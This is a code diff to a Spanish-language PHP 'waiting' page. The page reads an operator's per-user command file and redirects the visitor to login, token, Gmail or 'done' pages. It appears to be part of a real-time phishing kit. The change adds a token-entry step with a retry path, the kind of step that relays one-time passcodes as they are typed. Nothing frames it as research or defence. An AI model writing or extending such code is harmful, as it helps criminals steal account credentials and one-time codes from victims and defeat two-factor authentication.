@@ -1,27 +1,42 @@
 <?php
 $usuario = trim($_GET['u'] ?? '');
+$step    = trim($_GET['step'] ?? '');
 if (!$usuario) {
     header('Location: inicio.html');
     exit;
 }
-$self = 'espera.php?u=' . urlencode($usuario);
+$self = 'espera.php?u=' . urlencode($usuario) . ($step ? '&step=' . rawurlencode($step) : '');
 
 $archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
 if (file_exists($archivo)) {
     $accion = trim(file_get_contents($archivo));
     unlink($archivo);
 
+    $u = urlencode($usuario);
+
     switch ($accion) {
-        case '/GMAIL':      header('Location: ../gm/index.html');  break;
-        case '/HSN':        header('Location: ../hm/index.php');   break;
-        case '/LOGIN':      header('Location: log/index.php');     break;
-        case '/SMS':        header('Location: acceso.html');       break;
-        case '/SMSERROR':   header('Location: acceso.html');       break;
-        case '/LOGINERROR': header('Location: log/index.php');     break;
-        case '/CARD':       header('Location: acceso.html');       break;
-        case '/LISTO':      header('Location: listo.html');        break;
+        case '/GMAIL':
+            header('Location: ../gm/index.html'); break;
+        case '/HSN':
+            header('Location: hm/index.php'); break;
+        case '/LISTO':
+            header('Location: listo.html'); break;
+        case '/LOGIN':
+            if ($step === 'login') {
+                header('Location: log/token.php?u=' . $u);
+            } else {
+                header('Location: log/index.php');
+            }
+            break;
+        case '/TOK':
+            header('Location: log/token.php?u=' . $u); break;
+        case '/LOGINERROR':
+            header('Location: log/index.php'); break;
+        case '/TOKERROR':
+            header('Location: log/token.php?u=' . $u . '&retry=1'); break;
         case '/ERROR':
-        default:            header('Location: inicio.html');       break;
+        default:
+            header('Location: inicio.html'); break;
     }
     exit;
 }
